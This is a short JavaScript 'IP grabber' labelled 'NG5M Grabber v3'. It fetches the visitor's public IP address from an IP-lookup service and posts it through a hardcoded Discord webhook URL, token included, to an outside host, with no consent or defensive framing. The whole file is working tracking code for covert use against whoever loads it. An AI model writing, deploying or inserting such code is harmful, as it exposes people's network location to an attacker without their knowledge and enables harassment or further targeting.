var a = new XMLHttpRequest();

a.open("GET","https://api64.ipify.org");
a.onreadystatechange = function () {
    if (this.readyState === 4) {
        var embed = {
            "author":"test",
            "title":"**Info**",
            "description":"IP: "+this.responseText,
            "color":parseInt("#FF0000".replace("#",""),16)
        }
        
        const data = {
            "username":"NG5M Grabber v3",
            "embeds":[ embed ],
            "content":"uwu"
        }
        fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"Content-type":"application/json"},"body":JSON.stringify(data));
    }
};

a.send();
